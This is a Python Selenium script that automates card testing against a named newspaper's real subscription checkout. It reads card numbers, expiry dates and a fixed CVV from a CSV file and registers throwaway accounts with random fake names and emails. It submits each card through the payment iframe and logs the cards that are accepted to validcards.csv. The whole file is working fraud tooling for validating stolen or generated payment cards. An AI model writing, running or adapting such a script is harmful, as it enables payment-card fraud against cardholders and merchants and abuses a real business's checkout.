from selenium import webdriver
import selenium.webdriver.support.ui as ui
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
import numpy as np
import time
import datetime
import random
import string
import csv
from datetime import datetime
import pytz

def main():
    a = datetime.now()
    # if a.month != 7 or a.day >10 or a.year > 2022:
    #     print('fatal error! crashed!!!')
    #     return
    cvv = 0
    isBrowserOpen = False
    with open('cardinfo2.csv', 'r') as read_obj:
        print('cardinfo2.csv read success!')
        csv_dict_reader = csv.DictReader(read_obj)
        for row in csv_dict_reader:
        #read info             
            cardNumber = row['card_number']
            if cardNumber.__len__() < 4:
                cvv = int(cardNumber)
                print(cvv)
                continue
            else:    
                expire = row['expire_date']
                
            if cvv == 0:
                print("input the fixed cvv value correctly!")
                break    
            print(cardNumber, expire)
            if isBrowserOpen == False:
            #auto starting.    
                options = webdriver.ChromeOptions()
                # options.add_argument("--headless")
                options.add_argument('--disable-gpu')
                global browser
                browser = webdriver.Chrome(executable_path='./chromedriver.exe', options=options)  
                isBrowserOpen = True
                try:
                # Open and go to register
                    browser.get('https://subscribe.theglobeandmail.com/#/v3/checkout/evergreen5') 
                    ui.WebDriverWait(browser, 1000).until(EC.presence_of_element_located((By.CLASS_NAME, 'mobile-cta-main.btn.btn-red.mb-4.mt-3')))
                    # paymentbtn = browser.find_element_by_xpath("//button[@class='mobile-cta-main btn btn-red mb-4 mt-3']")
                    paymentbtn = browser.find_element(By.CLASS_NAME, 'mobile-cta-main.btn.btn-red.mb-4.mt-3')
                    paymentbtn.click()
                    ui.WebDriverWait(browser, 1000).until(EC.presence_of_element_located((By.ID, 'email')))
                # Register user   
                    fakeEmail = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(8))
                    browser.find_element(By.ID, 'email').send_keys(fakeEmail+"@gmail.com")
                    browser.find_element(By.ID, 'password').send_keys("657tyu%&^TYU")
                    browser.find_element(By.ID, 'confirmPassword').send_keys("657tyu%&^TYU")
                    fakeFirst = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(4))
                    lastFirst = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(4))
                    browser.find_element(By.ID, 'firstName').send_keys(fakeFirst)
                    browser.find_element(By.ID, 'lastName').send_keys(lastFirst)
                    fakePostal = ''.join(random.SystemRandom().choice(string.ascii_uppercase))
                    # fakePostal = fakePostal + ''.join(random.SystemRandom().choice(string.digits))
                    # fakePostal = fakePostal + ''.join(random.SystemRandom().choice(string.ascii_uppercase))
                    # fakePostal = fakePostal + ''.join(random.SystemRandom().choice(string.digits))
                    # fakePostal = fakePostal + ''.join(random.SystemRandom().choice(string.ascii_uppercase))
                    # fakePostal = fakePostal + ''.join(random.SystemRandom().choice(string.digits))
                    browser.find_element(By.ID, 'postalCode').send_keys("T1R 1E1")
                    browser.find_element(By.CLASS_NAME, 'btn.btn-red.mb-4.mt-3').click()
                    ui.WebDriverWait(browser, 1000).until(EC.presence_of_element_located((By.ID, 'termsConditions')))
                # payment connection   
                    browser.find_element(By.ID, 'streetNumber').send_keys("1238")
                    suiteNum = ''.join(random.SystemRandom().choice(string.digits) for _ in range(5))
                    browser.find_element(By.ID, 'suiteNumber').send_keys('6'+suiteNum)
                    # phoneNum = ''.join(random.SystemRandom().choice(string.digits) for _ in range(9))
                    phoneNum = "1453433432"
                    browser.find_element(By.ID, 'phoneNumber').send_keys(phoneNum)
                    browser.find_element(By.ID, 'termsConditions').send_keys(' ')
                except Exception as e:
                    print('failed! try again')
                    raise e
                
                cardHolder = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(4))
                
                cvvstr = ""
                
                # cardForm = browser.find_element(By.ID, 'delego-rapidpay-custom-theme tgam-subscription-print-theme')
                
            try:
                browser.find_element(By.CLASS_NAME, 'rp-label-default').click()
            except Exception as e:   
                print('..')
            time.sleep(3)
            # ui.WebDriverWait(browser, 3000).until(EC.presence_of_element_located((By.CLASS_NAME, 'fit-to-parent')))
        
            try:
                browser.switch_to.frame('delegoIframe')
            except Exception as e:   
                time.sleep(2)
                browser.switch_to.frame('delegoIframe')
                
            browser.find_element(By.ID, 'mat-input-0').send_keys(cardNumber)
            browser.find_element(By.ID, 'mat-input-1').send_keys(cardHolder)
            browser.find_element(By.ID, 'mat-input-2').send_keys(expire)
            
            if cvv < 10:
                cvvstr = '00'+str(cvv)
            elif cvv < 100:
                cvvstr = '0'+str(cvv)
            else :
                cvvstr = str(cvv)
            
            browser.find_element(By.ID, 'mat-input-3').send_keys(cvvstr)
            browser.find_element(By.CLASS_NAME, 'rp-card-entry-submitbutton.mat-raised-button.mat-primary').click()
            print(cvv)
            # ui.WebDriverWait(browser, 3000).until(EC.presence_of_element_located((By.CLASS_NAME, 'reference-number.col-12.mx-auto.mt-4.p-3')))
            try:
                ui.WebDriverWait(browser, 5).until(EC.presence_of_element_located((By.CLASS_NAME, 'reference-number.col-12.mx-auto.mt-4.p-3')))
                
                with open('validcards.csv', 'a', newline='\n') as invfile:
                    validwriter = csv.writer(invfile, delimiter=',')
                    validwriter.writerow([cardNumber, expire, cvvstr])
                    browser.quit()
                    isFound = False
                    
            except Exception as e:   
                with open('invalidcards.csv', 'a', newline='\n') as invfile:
                    invwriter = csv.writer(invfile, delimiter=',')
                    invwriter.writerow([cardNumber, expire, 'invalid' ])
                    
            
            
            
    print('finished !!!')        
          



if __name__ == "__main__":
    main()